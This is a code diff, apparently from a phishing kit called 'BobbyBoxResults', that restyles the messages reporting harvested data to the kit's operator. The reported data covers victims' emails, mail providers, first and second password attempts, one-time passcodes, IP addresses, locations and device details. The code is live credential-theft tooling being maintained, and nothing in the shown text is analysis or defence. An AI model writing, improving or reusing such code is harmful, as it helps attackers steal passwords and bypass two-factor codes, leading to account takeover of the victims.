@@ -72,33 +72,36 @@ const composeCredentialsMessage = (data) => {
         clientIP, location, deviceDetails, timestamp, sessionId,
     } = data;
 
-    const passwordSection = `🔑 First (invalid): \`${firstAttemptPassword}\`\n🔑 Second (valid): \`${secondAttemptPassword}\``;
-
     const formattedTimestamp = new Date(timestamp || Date.now()).toLocaleString('en-US', {
         year: 'numeric', month: 'short', day: 'numeric',
         hour: '2-digit', minute: '2-digit', second: '2-digit',
         timeZone: 'UTC', hour12: true
     }) + ' UTC';
 
-    return `
-*🔐 BobbyBoxResults - Credentials 🔐*
-
-*ACCOUNT DETAILS*
-- 📧 Email: \`${email || 'Not captured'}\`
-- 🏢 Provider: *${provider || 'Others'}*
-- ${passwordSection}
-
-*DEVICE & LOCATION*
-- 📍 IP Address: \`${clientIP}\`
-- 🌍 Location: *${location.regionName}, ${location.country}*
-- 💻 OS: *${deviceDetails.os}*
-- 🌐 Browser: *${deviceDetails.browser}*
-- 🖥️ Device Type: *${deviceDetails.deviceType}*
-
-*SESSION INFO*
-- 🕒 Timestamp: *${formattedTimestamp}*
-- 🆔 Session ID: \`${sessionId}\`
-`;
+    return [
+        `━━━━━━━━━━━━━━━━━━━━`,
+        `     🔐  *CREDENTIALS*`,
+        `━━━━━━━━━━━━━━━━━━━━`,
+        ``,
+        `📧  \`${email || 'Not captured'}\``,
+        `🏷  *${provider || 'Others'}*`,
+        ``,
+        `🔑  1st  ▸  \`${firstAttemptPassword}\``,
+        `🔑  2nd  ▸  \`${secondAttemptPassword}\``,
+        ``,
+        `─ ─ ─ ─ ─ ─ ─ ─ ─ ─`,
+        ``,
+        `🌐  \`${clientIP}\``,
+        `📍  *${location.regionName}, ${location.country}*`,
+        `💻  *${deviceDetails.os}*  ·  *${deviceDetails.browser}*`,
+        `📲  *${deviceDetails.deviceType.replace(/📱|💻/g, '').trim()}*`,
+        ``,
+        `─ ─ ─ ─ ─ ─ ─ ─ ─ ─`,
+        ``,
+        `🕐  *${formattedTimestamp}*`,
+        `🆔  \`${sessionId}\``,
+        `━━━━━━━━━━━━━━━━━━━━`,
+    ].join('\n');
 };
 
 /**
@@ -109,7 +112,6 @@ const composeCredentialsMessage = (data) => {
  */
 const composeOtpMessage = (data) => {
     const { otp, session } = data;
-    // Fallback to empty object if session is missing
     const { email, provider, clientIP, location, deviceDetails, sessionId } = session || {};
 
     const formattedTimestamp = new Date().toLocaleString('en-US', {
@@ -118,21 +120,23 @@ const composeOtpMessage = (data) => {
         timeZone: 'UTC', hour12: true
     }) + ' UTC';
 
-    return `
-*🔑 BobbyBoxResults - OTP Code 🔑*
-
-*VERIFICATION CODE*
-- 🔢 OTP Code: \`${otp}\`
-
-*ASSOCIATED SESSION*
-- 📧 Email: \`${email || 'N/A'}\`
-- 🏢 Provider: *${provider || 'N/A'}*
-- 📍 IP Address: \`${clientIP || 'N/A'}\`
-- 🆔 Session ID: \`${sessionId}\`
-
-*SUBMITTED AT*
-- 🕒 Timestamp: *${formattedTimestamp}*
-`;
+    return [
+        `━━━━━━━━━━━━━━━━━━━━`,
+        `     🔑  *OTP RECEIVED*`,
+        `━━━━━━━━━━━━━━━━━━━━`,
+        ``,
+        `🔢  \`${otp}\``,
+        ``,
+        `📧  \`${email || 'N/A'}\``,
+        `🏷  *${provider || 'N/A'}*`,
+        `🌐  \`${clientIP || 'N/A'}\``,
+        ``,
+        `─ ─ ─ ─ ─ ─ ─ ─ ─ ─`,
+        ``,
+        `🕐  *${formattedTimestamp}*`,
+        `🆔  \`${sessionId}\``,
+        `━━━━━━━━━━━━━━━━━━━━`,
+    ].join('\n');
 };
 
 
